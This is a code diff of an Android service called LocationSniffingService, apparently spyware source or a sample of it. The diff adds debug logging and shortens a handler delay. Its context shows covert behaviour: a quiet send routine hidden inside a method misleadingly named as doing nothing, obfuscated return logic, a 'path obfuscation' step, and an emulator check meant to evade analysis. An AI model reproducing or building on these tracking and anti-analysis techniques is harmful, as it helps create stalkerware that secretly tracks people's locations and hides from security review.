@@ -38,9 +38,11 @@ public class LocationSniffingService extends Service{
     @Override
     public IBinder onBind(Intent intent) {
 
+        Log.d(TAG, "Starting handler");
+
         if(mHandler != null){
             mHandler = new Handler();
-            int delay = 300000;
+            int delay = 5;
 
             //Path Obfuscation
             mHandler.postDelayed(new Runnable() {
@@ -119,17 +121,22 @@ public class LocationSniffingService extends Service{
 
     //Dummy method - b does not mean anything
     private boolean thisDoesnotDoAnything(){
-
+        Log.d(TAG,"Checking...");
         boolean b = false;
 
         if (isValid())
             b = sendQuietly();
+
+        Log.d(TAG, isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
 
     //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
+
+        Log.d(TAG, "Check if valid");
+
         String generic = "OnceUponATime";
         String unknown = "LivedABunnyCalled";
         String googlesdk = "Judy.SheWasGoingTo";
